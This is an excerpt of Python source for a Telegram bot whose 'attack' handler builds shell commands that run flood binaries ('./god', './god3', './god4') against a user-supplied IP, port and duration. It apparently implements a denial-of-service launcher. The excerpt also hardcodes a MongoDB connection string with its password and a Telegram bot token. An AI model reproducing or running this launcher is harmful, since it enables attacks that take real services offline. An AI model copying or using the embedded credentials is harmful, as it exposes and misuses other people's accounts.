...
MONGO_URI = 'mongodb+srv://shivamx:shivamx@cluster0.mnnm3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '8088213516:AAGaTnCMBdnUdm5RkS-py2SBBSvUUkQjvww'
ADMIN_USER_ID = 7402225119 
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./god3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./god4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./god {ip} {port} {duration} {byte_size} {threads}"
